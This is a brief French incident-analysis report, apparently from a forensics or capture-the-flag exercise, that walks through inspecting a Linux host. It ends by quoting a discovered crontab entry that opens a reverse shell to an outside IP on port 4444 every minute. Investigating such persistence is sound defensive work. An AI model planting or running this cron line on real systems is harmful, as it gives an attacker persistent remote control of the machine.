# Rapport d'analyse


dans la commande history on voit qu'il y a un fichier .zip qui a été protégé par un mot de passe "bosch_cyber_tools.zip"
ce mot de passe peut etre lu depuis "/tmp/mypassword"

>unzip bosch_cyber_tools.zip 

demande un mot de passe

> cat /etc/hosts
> 
172.18.0.2

>cat /var/www/html/index.html

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance Bosch-Cyber</title>
</head>
<body>
    <p>Sorry for the inconvenience. We'e performing some issues at the moment. We'll be back up shortly!</p>
</body>
</html>
```


>cat .cache/
cat .bash_history 
cat .bash_logout 
cat .bashrc 
cat .profile 
cat .viminfo 
cat .cache/

rien

>cat crontab

*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/138.66.89.12/4444 0>&1'

tache planifiée
